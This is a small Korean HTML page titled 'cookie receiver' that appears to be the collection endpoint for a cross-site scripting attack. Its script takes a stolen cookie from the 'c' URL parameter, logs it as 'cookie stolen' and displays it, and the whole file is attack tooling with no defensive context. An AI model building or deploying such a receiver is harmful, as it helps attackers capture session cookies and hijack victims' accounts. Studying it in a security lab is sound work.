<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>쿠키 수신기</title>
</head>
<body>
  <h1>💡 쿠키 수신됨:</h1>
  <p id="cookie"></p>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const cookie = urlParams.get('c');
    
    if (cookie) {
      console.log('[!] 쿠키 탈취됨: ' + cookie);
      document.getElementById("cookie").innerText = cookie;
    } else {
      document.getElementById("cookie").innerText = "❌ c 파라미터가 없습니다.";
    }
  </script>
</body>
</html>
